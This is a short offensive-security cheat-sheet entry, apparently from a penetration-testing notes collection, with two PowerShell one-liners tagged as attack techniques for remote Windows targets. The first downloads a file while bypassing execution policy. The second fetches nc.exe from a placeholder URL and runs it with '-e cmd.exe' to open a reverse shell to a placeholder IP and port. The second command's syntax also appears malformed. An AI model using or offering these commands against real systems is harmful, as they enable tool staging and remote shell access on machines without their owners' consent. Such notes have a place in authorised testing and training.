# powershell

% powershell, download

## Download with powershell
#platform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT 
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<dest_file>')"
```

## Download and execute with powershell
#platform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT #cat/ATTACK/EXPLOIT 
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile New-Object System.Net.WebClient.DownloadFile('<url_file>','nc.exe'); nc.exe <ip> <port> -e cmd.exe
```